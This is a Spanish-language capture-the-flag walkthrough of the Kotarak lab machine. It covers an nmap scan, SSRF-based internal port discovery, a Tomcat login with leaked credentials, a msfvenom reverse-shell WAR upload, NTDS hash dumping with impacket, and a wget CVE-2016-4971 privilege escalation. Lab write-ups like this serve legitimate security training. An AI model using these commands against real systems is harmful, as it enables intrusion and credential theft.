-----
- Tags: #tomcat #SSRF #NTDS #CVE-2016-4971 #malicious-war
--------
## Técnicas utilizadas
- Server Side Request Forgery (SSRF) [Internal Port Discovery]  
- Information Leakage [Backup]  
- Tomcat Exploitation [Malicious WAR]  
- Dumping hashes [NTDS]  
- Wget 1.12 Vulnerability [CVE-2016-4971] [Privilege Escalation] (PIVOTING)
## Procedimiento

![[Pasted image 20230629185205.png]]

#### Reconocimiento
Si lanzamos un **Nmap** podemos ver los siguientes puertos abiertos:
```ruby
# nmap -sCV -p22,8009,8080,60000 10.10.10.55 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-29 22:29 MST
Nmap scan report for 10.10.10.55
Host is up (0.13s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2d7ca0eb7cb0a51f72e75ea02241774 (RSA)
|   256 e8f1c0d37d9b4373ad373bcbe1648ee9 (ECDSA)
|_  256 6de926ad86022d68e1ebad66a06017b8 (ED25519)
8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE OPTIONS
|   Potentially risky methods: PUT DELETE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp  open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Apache Tomcat/8.5.5 - Error report
60000/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title:         Kotarak Web Hosting        
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.09 seconds
```

Un escaneo con **whatweb** nos presenta las siguientes tecnologías web corriendo por detrás:
``` ruby
# whatweb 10.10.10.55:8080 && whatweb 10.10.10.55:60000
http://10.10.10.55:8080 [404 Not Found] Apache-Tomcat[8.5.5], Content-Language[en], Country[RESERVED][ZZ], HTML5, IP[10.10.10.55], Title[Apache Tomcat/8.5.5 - Error report]
http://10.10.10.55:60000 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.55], Title[Kotarak Web Hosting][Title element contains newline(s)!]
```

-----
#### Server Side Request Forgery (SSRF) [Internal Port Discovery]  
Tenemos dos paginas webs, una por el puerto **8080** que esta corriendo un **TomCat** y otra que esta coriendo por el puerto **60000** que contiene una pagina personalizada la cual nos indica que es como un navegador.
En el **TomCat** no podemos hacer realmente nada, si intentamos ingresar al apartado de **Manager** con las credenciales por defecto `tomcat:s3cr3t` no nos funciona.

Por otro lado, en la pagina que funciona como navegador web, vemos que si hacemos una consulta al propio **localhost** por cualquier de sus puertos abiertos podemos visitar la pagina, esto quiere decir que se esta aconteciendo un **SSRF** que quizás vamos a poder convertir en un **Internal Port Discovery**.

Podemos intentar descubrir los puertos con **BurpSuite** o con **Wfuzz**, nosotros usaremos **wfuzz**:
```java
# wfuzz -c --hh=22 -z range,1-65535 "http://<iP>:60000/url.php?path=http://localhost:FUZZ"
```

Con los puertos identificados, podemos ir visitando uno por uno para ver si encontramos algo interesante.
Damos con un **BackUp**:
![[Pasted image 20230629224442.png]]

En este **BackUp** podemos ver unas credenciales:
![[Pasted image 20230629224456.png]]

Estas credenciales nos sirven para iniciar sesión en el **TomCat**, y con esto el acceso a la maquina esta casi garantizado.

--------
#### Tomcat Exploitation [Malicious WAR]
Procederemos a crear un archivo *.war* malicioso con **msfvenom**. La manera de hacerlo es el siguiente:
```
# msfvenom -p java/jsp_shell_reverse_tcp LHOST=<NuEsTrA-iP> LPORT=<nUeStRo-PuErTo> -f war -o shell.war
```

Resta ponernos en escucha y subir el *.war* al tomcat y acceder al enlace de este para que se nos otorgue una **reverse shell**.

-------
#### Dumping hashes [NTDS]  
Dentro de la maquina, enumerando archivos, podemos encontrar un **directorio** con nombre **pentest_data** el cual contiene dos archivos. Estos archivos hacen referencia a los tipos de archivo **NTDS**.
Nos traemos estos archivos a nuestra maquina para intentar dumpear los hashes con herramientas como **impacket-secretdump** de la siguiente manera:
```
# impacket-secretdump -ntds ntds.dit -system ntds.bin LOCAL
```

Esto nos va a dumpear varios hashes. Si estuvieramos en una maquina **windows** hubieramos podido hacer **pass-the-hash**. Podemos intentar romper estos hashes con **John**, con **HashCat** o con la propia pagina de **CrackStation**
Podemos filtrar por la parte que nos interesa del hash rapidamente con **awk**:
```
# cat hashes | awk '{print $4}' FS=":"
```

------
#### Wget 1.12 Vulnerability [CVE-2016-4971] [Privilege Escalation] (PIVOTING)
Una vez estemos como el usuario **Atanas** podemos observar que podemos entrar al directorio de root e intentar leer la flag, sin embargo, vemos que es un **rabit hole** porque simplemente nos imprime un mensaje diciendonos que estamos cercas. En el mismo directorio hay un archivo que al leerlo, vemos que hay una **iP** que nos esta haciendo un **GET** y descargando un archivo de nuestra maquina.

Podemos ponernos en escucha con **nc** por el puerto **80**. Como sabemos, los usuarios con privilegios minimos no podemos ejecutar este tipo de comandos, pero gracias a una configuracion en **authbind** podemos ejecutar:
```
# authbind  python3 -m http.server
```

Vemos que nos llega una petición por **GET**. Vemos que la versión de **wget** con la que se hace la petición hacia la maquina es antigua y cuenta con una vulnerabilidad de tipo **Remote Command Execution**.
Podemos seguir los pasos que vienen en el texto, y en la parte del script a la hora de definir la tarea cron poner la que se nos apetezca.